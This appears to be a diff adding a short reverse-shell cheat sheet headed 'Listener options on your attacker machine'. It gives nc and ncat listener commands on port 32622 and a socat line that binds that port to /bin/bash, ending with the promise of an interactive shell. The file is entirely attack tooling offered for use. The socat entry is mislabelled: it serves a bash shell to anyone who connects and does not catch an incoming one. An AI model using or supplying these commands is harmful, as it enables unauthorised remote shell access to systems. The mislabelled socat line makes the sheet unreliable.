@@ -1,0 +1,13 @@
+
+# Listener options on your attacker machine
+
+# Classic
+nc -lvnp 32622
+
+# Preferred
+ncat -lvnp 32622
+
+# socat
+socat TCP-LISTEN:32622,reuseaddr,fork EXEC:/bin/bash
+
+# After connection you receive an interactive shell.
